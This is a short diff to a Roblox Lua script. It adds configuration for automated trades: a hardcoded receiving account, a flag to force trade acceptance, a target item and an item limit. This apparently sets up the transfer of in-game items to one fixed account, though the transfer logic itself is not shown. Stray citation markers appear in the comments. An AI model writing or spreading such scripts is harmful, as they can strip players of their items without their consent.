@@ -2,6 +2,11 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+-- ================= CONFIGURATION =================
+MainAccUsername = {"Her0eXBuildera31"} -- TradeAPI/SendTradeRequest[cite: 1]
+ForceReceiver = true -- true or false ("TradeAPI/AcceptOrDeclineTradeRequest")[cite: 2]
+local TARGET_ITEM_NAME = "retred_egg"
+local MAX_ITEMS_TO_ADD = 18 -- Trade slot limit
 -- =================================================
 
 -- Remotes and Functions
